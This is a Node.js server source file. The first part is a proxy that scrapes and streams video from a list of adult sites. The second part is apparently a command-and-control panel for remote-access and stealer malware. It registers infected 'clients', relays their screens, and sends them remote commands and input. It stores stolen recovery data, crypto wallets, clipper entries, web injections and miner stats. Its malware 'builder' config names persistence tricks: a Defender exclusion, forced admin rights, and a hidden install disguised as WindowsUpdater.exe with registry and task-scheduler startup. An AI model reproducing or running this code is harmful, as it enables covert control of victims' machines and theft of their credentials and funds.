const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const https = require('https');
const httpNative = require('http');
const { URL } = require('url');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

const OPERATOR_KEY = process.env.OPERATOR_KEY || 'changeme';
const PORT = process.env.PORT || 3000;

const clients = new Map();
const operators = new Set();

const db = {
  recovery: [],
  wallets: [],
  proxy: [],
  clipper: { entries: [], enabled: false },
  webinjection: [],
  sorter: [],
  autotasks: [],
  filestore: [],
  miner: { jobs: [], stats: { active: 0, hashrate: 0, accepted: 0, rejected: 0 } },
  checker: { configs: [] },
  checkersessions: [],
  builder: {
    clientTag: 'Guest', note: '',
    mutex: 'CoreHelper_' + Math.random().toString(16).slice(2, 14),
    defenderExclusion: false, forceAdmin: false, debug: false,
    install: { enabled: false, location: '%appdata%', folder: 'UpdaterPolicy', filename: 'WindowsUpdater.exe', hidden: false, system: false, melt: false, registry: false, taskScheduler: false },
    final: { client: 'exe', pumpEnabled: false, pumpSize: 1 },
    builds: []
  }
};

app.use(express.json({ limit: '100mb' }));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/style.css', (req, res) => res.sendFile(__dirname + '/style.css'));
app.get('/panel.js', (req, res) => res.sendFile(__dirname + '/panel.js'));
app.get('/socket.io/socket.io.js', (req, res) =>
  res.sendFile(require.resolve('socket.io/client-dist/socket.io.js'))
);

const ALLOWED_HOSTS = new Set([
  'hentai.pro',
  'www.hentai.pro',
  'cdn.hentai.pro',
  'v.hentai.pro',
  'media.hentai.pro',
  'stream.hentai.pro',
  'player.hentai.pro',

  'nhplayer.com',
  'www.nhplayer.com',
  'cdn.nhplayer.com',
  'v.nhplayer.com',
  'stream.nhplayer.com',
  'player.nhplayer.com',
  'nhplayer.io',
  'www.nhplayer.io',
  'nhplayer.net',
  'www.nhplayer.net',

  'htstreaming.com',
  'www.htstreaming.com',
  'cdn.htstreaming.com',
  'v.htstreaming.com',
  'stream.htstreaming.com',
  'player.htstreaming.com',
  'htstreaming.io',
  'www.htstreaming.io',
  'htstreaming.net',
  'www.htstreaming.net',

  'hentai-pro.com',
  'www.hentai-pro.com',
  'cdn.hentai-pro.com',
  'v.hentai-pro.com',
  'player.hentai-pro.com',
  'stream.hentai-pro.com',

  'hentaimama.io',
  'www.hentaimama.io',
  'cdn.hentaimama.io',
  'player.hentaimama.io',
  'stream.hentaimama.io',

  'hentaigem.com',
  'www.hentaigem.com',
  'cdn.hentaigem.com',
  'player.hentaigem.com',
  'stream.hentaigem.com',

  'hentaicity.com',
  'www.hentaicity.com',
  'cdn.hentaicity.com',
  'player.hentaicity.com',
  'stream.hentaicity.com',

  'hentaihaven.xxx',
  'www.hentaihaven.xxx',
  'cdn.hentaihaven.xxx',
  'player.hentaihaven.xxx',

  'hanime.tv',
  'www.hanime.tv',
  'cdn.hanime.tv',
  'v.hanime.tv',
  'stream.hanime.tv',

  'hentai.tv',
  'www.hentai.tv',
  'cdn.hentai.tv',

  'jable.tv',
  'www.jable.tv',
  'cdn.jable.tv',

  'missav.ws',
  'www.missav.ws',
  'cdn.missav.ws'
]);

function isAllowedHost(host) {
  if (!host) return false;
  const h = host.toLowerCase().split(':')[0];
  if (ALLOWED_HOSTS.has(h)) return true;
  for (const allowed of ALLOWED_HOSTS) {
    if (h === allowed) return true;
    if (h.endsWith('.' + allowed)) return true;
  }
  return false;
}

function fetchBuffer(targetUrl, { timeout = 12000, redirects = 5, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const attempt = (url, n) => {
      if (n > redirects) return reject(new Error('too many redirects'));
      let u;
      try { u = new URL(url); } catch { return reject(new Error('bad url')); }
      if (u.protocol !== 'http:' && u.protocol !== 'https:') return reject(new Error('bad protocol'));
      if (!isAllowedHost(u.hostname)) return reject(new Error('host not allowed: ' + u.hostname));

      const lib = u.protocol === 'https:' ? https : httpNative;
      const req = lib.get({
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port || undefined,
        path: u.pathname + u.search,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': u.origin + '/',
          ...headers
        }
      }, (res) => {
        if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
          let next = res.headers.location;
          try { next = new URL(next, u).toString(); } catch {}
          res.resume();
          return attempt(next, n + 1);
        }
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks), finalUrl: url }));
      });
      req.setTimeout(timeout, () => { req.destroy(new Error('timeout')); });
      req.on('error', reject);
    };
    attempt(targetUrl, 0);
  });
}

function pipeStream(targetUrl, req, res, redirects = 0) {
  if (redirects > 5) { res.status(508).end(); return; }
  let u;
  try { u = new URL(targetUrl); } catch { res.status(400).end(); return; }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') { res.status(400).end(); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  const lib = u.protocol === 'https:' ? https : httpNative;
  const headers = {
    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
    'Accept': req.headers['accept'] || '*/*',
    'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    'Referer': u.origin + '/'
  };
  if (req.headers['range']) headers['Range'] = req.headers['range'];
  if (req.headers['if-range']) headers['If-Range'] = req.headers['if-range'];

  const proxyReq = lib.request({
    protocol: u.protocol,
    hostname: u.hostname,
    port: u.port || (u.protocol === 'https:' ? 443 : 80),
    path: u.pathname + u.search,
    method: 'GET',
    headers
  }, (proxyRes) => {
    if ([301,302,303,307,308].includes(proxyRes.statusCode) && proxyRes.headers.location) {
      let next = proxyRes.headers.location;
      try { next = new URL(next, u).toString(); } catch {}
      proxyRes.resume();
      pipeStream(next, req, res, redirects + 1);
      return;
    }
    const passthrough = ['content-type','content-length','content-range','accept-ranges','cache-control','etag','last-modified'];
    passthrough.forEach(h => { if (proxyRes.headers[h]) res.setHeader(h, proxyRes.headers[h]); });
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Range');
    res.setHeader('Access-Control-Expose-Headers', 'Content-Range, Accept-Ranges, Content-Length');
    res.status(proxyRes.statusCode || 200);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', () => { try { if (!res.headersSent) res.status(502).end(); } catch {} });
  req.on('close', () => proxyReq.destroy());
  proxyReq.end();
}

function rewriteHtml(html, baseUrl) {
  const base = new URL(baseUrl);
  const origin = base.origin;
  const proxyPrefix = '/api/anonymous?u=';
  const hostRe = base.hostname.replace(/\./g, '\\.').replace(/-/g, '\\-');

  html = html.replace(
    new RegExp('(href|src|data-src|poster|action)=("|\')(https?:\\/\\/(?:[^"\'\\s]*\\.)?' + hostRe + '[^"\']*)\\2', 'gi'),
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(url)}${q}`
  );
  html = html.replace(
    new RegExp('(href|src|data-src|poster|action)=("|\')(\\/\\/(?:[^"\'\\s]*\\.)?' + hostRe + '[^"\']*)\\2', 'gi'),
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent('https:' + url)}${q}`
  );
  html = html.replace(
    /(href|src|data-src|poster|action)=("|')(\/[^"'\/][^"']*)\2/gi,
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(origin + url)}${q}`
  );
  return html;
}

function extractSources(html, baseUrl) {
  const base = new URL(baseUrl);
  const found = new Map();

  const add = (raw, priority) => {
    if (!raw) return;
    let abs;
    try { abs = new URL(raw, base).toString(); } catch { return; }
    let host;
    try { host = new URL(abs).hostname; } catch { return; }
    if (!isAllowedHost(host)) return;
    const existing = found.get(abs);
    if (existing === undefined || priority < existing) found.set(abs, priority);
  };

  const isMediaUrl = (u) => /\.(m3u8|mp4|webm|mkv|m4v|mov|ts)(\?|#|$)/i.test(u);

  let m;
  for (const re of [
    /<source[^>]+src=["']([^"']+)["']/gi,
    /<source[^>]+data-src=["']([^"']+)["']/gi,
    /<video[^>]+src=["']([^"']+)["']/gi,
    /<video[^>]+data-src=["']([^"']+)["']/gi,
    /<video[^>]+data-video-src=["']([^"']+)["']/gi
  ]) {
    while ((m = re.exec(html)) !== null) add(m[1], 1);
  }

  for (const re of [
    /(?:file|source|src|url|videoUrl|video_url|playlist|hls|dash|mp4|stream|streamUrl|sources?)\s*[:=]\s*["']([^"']+)["']/gi,
    /["'](?:file|source|src|url|videoUrl|playlist|hls|stream)["']\s*:\s*["']([^"']+)["']/gi
  ]) {
    while ((m = re.exec(html)) !== null) {
      if (isMediaUrl(m[1])) add(m[1], 3);
    }
  }

  for (const re of [
    /"(?:sources?|tracks?)"\s*:\s*\[([^\]]+)\]/gi,
    /'sources?'\s*:\s*\[([^\]]+)\]/gi
  ]) {
    while ((m = re.exec(html)) !== null) {
      const inner = m[1];
      const urlRe = /["']?(?:file|src|url|label)["']?\s*[:=]\s*["']([^"']+)["']/gi;
      let mm;
      while ((mm = urlRe.exec(inner)) !== null) {
        if (isMediaUrl(mm[1])) add(mm[1], 2);
      }
    }
  }

  for (const re of [
    /https?:\/\/[^"'\\\s<>()]+?\.(?:m3u8|mp4|webm|mkv|m4v|mov)(?:[^"'\\\s<>()]*)/gi,
    /\/\/[^"'\\\s<>()]+?\.(?:m3u8|mp4|webm|mkv|m4v|mov)(?:[^"'\\\s<>()]*)/gi
  ]) {
    while ((m = re.exec(html)) !== null) {
      const raw = m[0].startsWith('//') ? 'https:' + m[0] : m[0];
      add(raw, 4);
    }
  }

  const reEsc = /(https?:\\\/\\\/[^"'\s]+?\.(?:m3u8|mp4|webm|mkv|m4v|mov)(?:[^"'\s]*))/gi;
  while ((m = reEsc.exec(html)) !== null) {
    const unescaped = m[1].replace(/\\\//g, '/').replace(/\\u002F/gi, '/');
    add(unescaped, 4);
  }

  return [...found.entries()].sort((a, b) => a[1] - b[1]).map(([u]) => u);
}

function extractIframes(html, baseUrl) {
  const base = new URL(baseUrl);
  const out = new Set();
  const re = /<iframe[^>]+src=["']([^"']+)["']/gi;
  let m;
  while ((m = re.exec(html)) !== null) {
    let abs;
    try { abs = new URL(m[1], base).toString(); } catch { continue; }
    out.add(abs);
  }
  return [...out];
}

async function collectSourcesDeep(startUrl, depth = 3, seen = new Set()) {
  const collected = new Set();
  const allIframes = new Set();
  const trace = [];

  const visit = async (url, d) => {
    if (d < 0 || seen.has(url)) return;
    seen.add(url);
    const entry = { url, depth: d, status: 'fetching' };
    trace.push(entry);

    let host;
    try { host = new URL(url).hostname; } catch {
      entry.status = 'error';
      entry.error = 'bad url';
      return;
    }
    if (!isAllowedHost(host)) {
      entry.status = 'skipped';
      entry.error = 'host not in allowlist';
      return;
    }

    let r;
    try { r = await fetchBuffer(url, { headers: { 'X-Requested-With': 'XMLHttpRequest' } }); } catch (e) {
      entry.status = 'error';
      entry.error = String(e.message || e);
      return;
    }
    entry.status = r.status;
    entry.contentType = r.headers['content-type'] || '';
    entry.bytes = r.body.length;
    if (r.status < 200 || r.status >= 400) return;

    const ct = (r.headers['content-type'] || '').toLowerCase();
    if (/application\/vnd\.apple\.mpegurl/i.test(ct) || /\.m3u8/i.test(url)) collected.add(url);
    if (/\.(mp4|webm|mkv|m4v|mov)(\?|#|$)/i.test(url)) collected.add(url);

    const looksHtml = ct.includes('text/html') || ct.includes('javascript') || ct.includes('json') || ct.includes('text/plain') || ct === '';
    if (!looksHtml) return;

    const html = r.body.toString('utf8');
    const found = extractSources(html, url);
    entry.sourcesFound = found.length;
    found.forEach(s => collected.add(s));
    if (!found.length) {
      entry.preview = html.slice(0, 1500);
    }

    const iframes = extractIframes(html, url);
    entry.iframesFound = iframes.length;
    iframes.forEach(i => allIframes.add(i));
    for (const i of iframes) {
      if (d > 1) await visit(i, d - 1);
    }

    const apiCandidates = new Set();

    const reApiExt = /["']([^"']*(?:api|source|video|playlist|stream|hls|embed)[^"']*\.(?:json|php|m3u8|mp4)[^"']*)["']/gi;
    let mm;
    while ((mm = reApiExt.exec(html)) !== null) {
      try { apiCandidates.add(new URL(mm[1], url).toString()); } catch {}
    }

    const reApiNoExt = /["']([^"']*(?:\/api\/|\/source\/|\/playlist\/|\/getvideo|\/get_video|\/video\/|\/embed\/)[^"'\s]*)["']/gi;
    while ((mm = reApiNoExt.exec(html)) !== null) {
      try { apiCandidates.add(new URL(mm[1], url).toString()); } catch {}
    }

    const mNh = url.match(/^https?:\/\/(?:www\.)?nhplayer\.com\/v\/([A-Za-z0-9_-]+)/);
    if (mNh) {
      const id = mNh[1];
      const origin = new URL(url).origin;
      apiCandidates.add(origin + '/api/source/' + id);
      apiCandidates.add(origin + '/api/source/' + id + '?type=mp4');
      apiCandidates.add(origin + '/api/video/' + id);
      apiCandidates.add(origin + '/v/' + id + '/playlist');
    }

    const mHt = url.match(/^https?:\/\/(?:www\.)?htstreaming\.com\/player\/index\.php\?data=([^&]+)/);
    if (mHt) {
      const token = mHt[1];
      const origin = new URL(url).origin;
      apiCandidates.add(origin + '/player/index.php?data=' + token + '&do=getVideo');
      apiCandidates.add(origin + '/player/ajax.php?data=' + token);
      apiCandidates.add(origin + '/player/getVideo.php?data=' + token);
    }

    for (const c of apiCandidates) {
      if (d > 1) await visit(c, d - 1);
    }
  };

  await visit(startUrl, depth);
  return { sources: [...collected], iframes: [...allIframes], trace };
}

app.get('/api/anonymous', async (req, res) => {
  const target = req.query.u;
  if (!target) { res.status(400).json({ error: 'missing u' }); return; }
  let u;
  try { u = new URL(target); } catch { res.status(400).end(); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  const accept = req.headers['accept'] || '';
  const looksLikeMedia = /\.(mp4|m3u8|ts|webm|mkv|m4v|mov)(\?|#|$)/i.test(u.pathname + u.search);
  const hasRange = !!req.headers['range'];
  const wantsHtml = accept.includes('text/html') || (!hasRange && !looksLikeMedia);

  if (!wantsHtml) { pipeStream(target, req, res); return; }

  try {
    const r = await fetchBuffer(target);
    if ([301,302,303,307,308].includes(r.status) && r.headers.location) {
      let next = r.headers.location;
      try { next = new URL(next, u).toString(); } catch {}
      res.redirect('/api/anonymous?u=' + encodeURIComponent(next));
      return;
    }
    const body = r.body.toString('utf8');
    const rewritten = rewriteHtml(body, target);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.send(rewritten);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'upstream fetch failed', detail: String(e.message || e) });
  }
});

app.post('/api/anonymous/resolve', async (req, res) => {
  const { url } = req.body || {};
  if (!url) { res.status(400).json({ error: 'missing url' }); return; }
  let u;
  try { u = new URL(url); } catch { res.status(400).json({ error: 'bad url' }); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  try {
    const { sources, iframes, trace } = await collectSourcesDeep(url, 3);
    res.json({ sources, iframes, pageUrl: url, trace });
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'fetch failed', detail: String(e.message || e) });
  }
});

app.get('/api/anonymous/stream', (req, res) => {
  const target = req.query.u;
  if (!target) { res.status(400).end(); return; }
  pipeStream(target, req, res);
});

function auth(req, res, next) {
  const key = req.headers['x-operator-key'] || req.query.key;
  if (key !== OPERATOR_KEY) return res.status(401).json({ error: 'unauthorized' });
  next();
}

app.get('/api/clients', auth, (req, res) => {
  res.json([...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
});

app.post('/api/cmd/:id', auth, (req, res) => {
  const c = clients.get(req.params.id);
  if (!c) return res.status(404).json({ error: 'client not found' });
  c.socket.emit('cmd', req.body);
  res.json({ ok: true });
});

function collection(name) {
  app.get('/api/' + name, auth, (req, res) => res.json(db[name] || []));
  app.post('/api/' + name, auth, (req, res) => {
    const item = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), ...req.body, createdAt: new Date().toISOString() };
    if (Array.isArray(db[name])) db[name].push(item);
    res.json(item);
  });
  app.delete('/api/' + name + '/:id', auth, (req, res) => {
    if (Array.isArray(db[name])) db[name] = db[name].filter(x => x.id !== req.params.id);
    res.json({ ok: true });
  });
}

['recovery','wallets','proxy','webinjection','sorter','autotasks','filestore','checkersessions'].forEach(collection);

app.get('/api/clipper', auth, (req, res) => res.json(db.clipper));
app.post('/api/clipper', auth, (req, res) => { db.clipper = { ...db.clipper, ...req.body }; res.json(db.clipper); });

app.get('/api/miner', auth, (req, res) => res.json(db.miner));
app.post('/api/miner', auth, (req, res) => { db.miner = { ...db.miner, ...req.body }; res.json(db.miner); });

app.get('/api/checker', auth, (req, res) => res.json(db.checker));
app.post('/api/checker', auth, (req, res) => { db.checker = { ...db.checker, ...req.body }; res.json(db.checker); });

app.get('/api/builder', auth, (req, res) => res.json(db.builder));
app.post('/api/builder', auth, (req, res) => { db.builder = { ...db.builder, ...req.body }; res.json(db.builder); });

app.post('/api/builder/build', auth, (req, res) => {
  const build = {
    id: Date.now().toString(36),
    name: db.builder.clientTag || 'Guest',
    size: (Math.random() * 400 + 400).toFixed(0) + ' KB',
    createdAt: new Date().toISOString(),
    password: Math.floor(1000 + Math.random() * 9000).toString()
  };
  db.builder.builds.unshift(build);
  db.builder.builds = db.builder.builds.slice(0, 10);
  res.json(build);
});

app.get('/api/stats', auth, (req, res) => {
  res.json({
    clients: clients.size,
    recovery: db.recovery.length,
    wallets: db.wallets.length,
    proxy: db.proxy.length,
    filestore: db.filestore.length,
    checkersessions: db.checkersessions.length
  });
});

io.on('connection', (socket) => {
  socket.on('operator:register', (key) => {
    if (key !== OPERATOR_KEY) { socket.emit('operator:error', 'invalid key'); return socket.disconnect(); }
    operators.add(socket.id);
    socket.emit('operator:ready');
    socket.emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('register', (meta) => {
    clients.set(socket.id, { socket, meta, lastFrame: null });
    io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('frame', (data) => {
    const c = clients.get(socket.id);
    if (c) { c.lastFrame = data; io.to([...operators]).emit('frame', { id: socket.id, data }); }
  });
  socket.on('output', (payload) => { io.to([...operators]).emit('output', { id: socket.id, ...payload }); });
  socket.on('push', ({ collection: col, item }) => {
    if (Array.isArray(db[col])) {
      const entry = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), clientId: socket.id, ...item, createdAt: new Date().toISOString() };
      db[col].push(entry);
      io.to([...operators]).emit('push', { collection: col, item: entry });
    }
  });
  socket.on('operator:cmd', ({ targetId, cmd }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('cmd', cmd);
  });
  socket.on('operator:input', ({ targetId, evt }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('input', evt);
  });
  socket.on('disconnect', () => {
    if (clients.has(socket.id)) {
      clients.delete(socket.id);
      io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
    }
    operators.delete(socket.id);
  });
});

server.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
